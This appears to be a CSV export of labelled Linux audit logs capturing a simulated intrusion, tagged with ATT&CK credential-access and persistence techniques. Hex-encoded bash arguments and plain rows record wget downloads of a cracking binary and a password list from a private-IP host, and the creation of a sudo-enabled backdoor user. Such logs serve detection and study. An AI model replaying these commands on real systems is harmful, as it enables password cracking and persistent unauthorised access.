@timestamp,a0,a1,a10,a2,a3,a4,a5,a6,a7,a8,a9,command_executed,event.original,host.name,message,sequence,tactic,technique
"Sep 27, 2024 @ 15:08:13.525",/bin/bash,-c,-,-,-,-,-,-,-,-,-,/bin/bash -c,"type=EXECVE msg=audit(1727449685.990:341313): argc=3 a0=""/bin/bash"" a1=""-c"" a2=7767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F6A6F686E202D4F202F746D702F6A6F686E3B2063686D6F64202B78202F746D702F6A6F686E3B207767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F70617373776F7264732E747874202D4F202F746D702F70617373776F7264732E7478743B",04472f17f8ed,"type=EXECVE msg=audit(1727449685.990:341313): argc=3 a0=""/bin/bash"" a1=""-c"" a2=7767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F6A6F686E202D4F202F746D702F6A6F686E3B2063686D6F64202B78202F746D702F6A6F686E3B207767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F70617373776F7264732E747874202D4F202F746D702F70617373776F7264732E7478743B",341313,-,-
"Sep 27, 2024 @ 15:08:13.525",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449685.986:341312): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320277767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F6A6F686E202D4F202F746D702F6A6F686E3B2063686D6F64202B78202F746D702F6A6F686E3B207767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F70617373776F7264732E747874202D4F202F746D702F70617373776F7264732E7478743B27",04472f17f8ed,"type=EXECVE msg=audit(1727449685.986:341312): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320277767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F6A6F686E202D4F202F746D702F6A6F686E3B2063686D6F64202B78202F746D702F6A6F686E3B207767657420687474703A2F2F3139322E3136382E3132322E3233303A383038302F70617373776F7264732E747874202D4F202F746D702F70617373776F7264732E7478743B27",341312,-,-
"Sep 27, 2024 @ 15:08:13.526",chmod,#NAME?,-,/tmp/john,-,-,-,-,-,-,-,chmod +x /tmp/john,"type=EXECVE msg=audit(1727449686.026:341316): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/john""",04472f17f8ed,"type=EXECVE msg=audit(1727449686.026:341316): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/john""",341316,credential-access,Brute Force: Password Cracking
"Sep 27, 2024 @ 15:08:13.527",wget,http://192.168.122.230:8080/passwords.txt,-,#NAME?,/tmp/passwords.txt,-,-,-,-,-,-,wget http://192.168.122.230:8080/passwords.txt -O /tmp/passwords.txt,"type=EXECVE msg=audit(1727449686.046:341318): argc=4 a0=""wget"" a1=""http://192.168.122.230:8080/passwords.txt"" a2=""-O"" a3=""/tmp/passwords.txt""",04472f17f8ed,"type=EXECVE msg=audit(1727449686.046:341318): argc=4 a0=""wget"" a1=""http://192.168.122.230:8080/passwords.txt"" a2=""-O"" a3=""/tmp/passwords.txt""",341318,credential-access,Brute Force: Password Cracking
"Sep 27, 2024 @ 15:08:58.534",openssl,passwd,-,-1,newpassword,-,-,-,-,-,-,openssl passwd -1 newpassword,"type=EXECVE msg=audit(1727449730.026:341322): argc=4 a0=""openssl"" a1=""passwd"" a2=""-1"" a3=""newpassword""",04472f17f8ed,"type=EXECVE msg=audit(1727449730.026:341322): argc=4 a0=""openssl"" a1=""passwd"" a2=""-1"" a3=""newpassword""",341322,-,-
"Sep 27, 2024 @ 15:08:58.534",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449730.018:341320): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320277375646F2075736572616464202D6D202D73202F62696E2F62617368202D702024286F70656E73736C20706173737764202D31206E657770617373776F72642920737570706F72745F33383839343561303B207375646F20757365726D6F64202D6147207375646F20737570706F72745F333838393435613027",04472f17f8ed,"type=EXECVE msg=audit(1727449730.018:341320): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320277375646F2075736572616464202D6D202D73202F62696E2F62617368202D702024286F70656E73736C20706173737764202D31206E657770617373776F72642920737570706F72745F33383839343561303B207375646F20757365726D6F64202D6147207375646F20737570706F72745F333838393435613027",341320,-,-
"Sep 27, 2024 @ 15:08:58.534",/bin/bash,-c,-,-,-,-,-,-,-,-,-,/bin/bash -c,"type=EXECVE msg=audit(1727449730.022:341321): argc=3 a0=""/bin/bash"" a1=""-c"" a2=7375646F2075736572616464202D6D202D73202F62696E2F62617368202D702024286F70656E73736C20706173737764202D31206E657770617373776F72642920737570706F72745F33383839343561303B207375646F20757365726D6F64202D6147207375646F20737570706F72745F3338383934356130",04472f17f8ed,"type=EXECVE msg=audit(1727449730.022:341321): argc=3 a0=""/bin/bash"" a1=""-c"" a2=7375646F2075736572616464202D6D202D73202F62696E2F62617368202D702024286F70656E73736C20706173737764202D31206E657770617373776F72642920737570706F72745F33383839343561303B207375646F20757365726D6F64202D6147207375646F20737570706F72745F3338383934356130",341321,-,-
"Sep 27, 2024 @ 15:08:58.534",sudo,useradd,-,#NAME?,#NAME?,/bin/bash,#NAME?,$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0,support_388945a0,-,-,sudo useradd -m -s /bin/bash -p $1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0 support_388945a0,"type=EXECVE msg=audit(1727449730.166:341323): argc=8 a0=""sudo"" a1=""useradd"" a2=""-m"" a3=""-s"" a4=""/bin/bash"" a5=""-p"" a6=""$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0"" a7=""support_388945a0""",04472f17f8ed,"type=EXECVE msg=audit(1727449730.166:341323): argc=8 a0=""sudo"" a1=""useradd"" a2=""-m"" a3=""-s"" a4=""/bin/bash"" a5=""-p"" a6=""$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0"" a7=""support_388945a0""",341323,-,-
"Sep 27, 2024 @ 15:08:58.535",useradd,#NAME?,-,#NAME?,/bin/bash,#NAME?,$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0,support_388945a0,-,-,-,useradd -m -s /bin/bash -p $1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0 support_388945a0,"type=EXECVE msg=audit(1727449730.194:341328): argc=7 a0=""useradd"" a1=""-m"" a2=""-s"" a3=""/bin/bash"" a4=""-p"" a5=""$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0"" a6=""support_388945a0""",04472f17f8ed,"type=EXECVE msg=audit(1727449730.194:341328): argc=7 a0=""useradd"" a1=""-m"" a2=""-s"" a3=""/bin/bash"" a4=""-p"" a5=""$1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0"" a6=""support_388945a0""",341328,-,-
"Sep 27, 2024 @ 15:08:58.536",sudo,usermod,-,#NAME?,sudo,support_388945a0,-,-,-,-,-,sudo usermod -aG sudo support_388945a0,"type=EXECVE msg=audit(1727449731.018:341341): argc=5 a0=""sudo"" a1=""usermod"" a2=""-aG"" a3=""sudo"" a4=""support_388945a0""",04472f17f8ed,"type=EXECVE msg=audit(1727449731.018:341341): argc=5 a0=""sudo"" a1=""usermod"" a2=""-aG"" a3=""sudo"" a4=""support_388945a0""",341341,persistence,Account Manipulation
